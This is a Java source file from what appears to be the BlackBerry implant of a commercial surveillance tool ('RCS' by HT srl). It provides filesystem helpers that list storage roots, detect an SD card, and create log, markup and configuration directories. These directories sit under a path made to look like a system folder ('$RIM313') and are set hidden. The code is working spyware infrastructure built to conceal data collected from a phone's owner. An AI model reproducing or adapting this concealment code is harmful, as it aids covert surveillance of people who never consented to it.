/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Path.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.fs;

import java.io.IOException;
import java.util.Enumeration;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;
import javax.microedition.io.file.FileSystemRegistry;

import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class Path {
    private static Debug debug = new Debug("Path", DebugLevel.VERBOSE);

    public static final String SD_PATH = "file:///SDCard/BlackBerry/system/$RIM313/";
    public static final String USER_PATH = "file:///store/home/user/$RIM313/";

    public static final String LOG_DIR = "1";
    public static final String MARKUP_DIR = "2";
    public static final String CONF_DIR = "2";
    
    private Path() {
    };

    public static synchronized boolean createDirectory(String dirName) {
        FileConnection fconn = null;

        try {
            fconn = (FileConnection) Connector.open(dirName,
                    Connector.READ_WRITE);

            if (fconn.exists()) {
                if (debug != null) {
                    debug.trace("Directory exists");
                }

                return false;
            }

            fconn.mkdir();
            fconn.setHidden(true);

            Check.ensures(fconn.exists(), "Couldn't create dir");

        } catch (IOException e) {

            e.printStackTrace();
            return false;

        } finally {
            if (fconn != null) {
                try {
                    fconn.close();
                } catch (IOException e) {
                    if (debug != null) {
                        debug.error(e.toString());
                    }
                    
                }
            }
        }

        return true;
    }

    public static Vector getRoots() {
        Enumeration roots = FileSystemRegistry.listRoots();
        Vector vector = new Vector();

        while (roots.hasMoreElements()) {
            String root = (String) roots.nextElement();
            vector.addElement(root);

            FileConnection fc;

            try {
                fc = (FileConnection) Connector.open("file:///" + root);
                System.out.println(root + " " + fc.availableSize());
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

        return vector;
    }

    public static void printRoots() {
        Enumeration roots = FileSystemRegistry.listRoots();

        while (roots.hasMoreElements()) {
            String root = (String) roots.nextElement();
            FileConnection fc;

            try {
                fc = (FileConnection) Connector.open("file:///" + root);
                System.out.println(root + " " + fc.availableSize());
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }

    public static boolean isSDPresent() {
        Enumeration roots = FileSystemRegistry.listRoots();

        while (roots.hasMoreElements()) {
            String path = (String) roots.nextElement();

            if (path.indexOf("SDCard") >= 0) {
                if (debug != null) {
                    debug.info("SDPresent FOUND: " + path);
                }
                return true;
            } else {
                if (debug != null) {
                    debug.trace("SDPresent NOT:" + path);
                }
            }
        }

        return false;
    }
    
    public static void makeDirs(boolean storeToMMC) {
        if (storeToMMC) {
            createDirectory(Path.SD_PATH);
            createDirectory(Path.SD_PATH + Path.LOG_DIR);
            createDirectory(Path.SD_PATH + Path.MARKUP_DIR);
            createDirectory(Path.SD_PATH + Path.CONF_DIR);

        } else {
            createDirectory(Path.USER_PATH);
            createDirectory(Path.USER_PATH + Path.LOG_DIR);
            createDirectory(Path.USER_PATH + Path.MARKUP_DIR);
            createDirectory(Path.USER_PATH + Path.CONF_DIR);

        }
    }
}
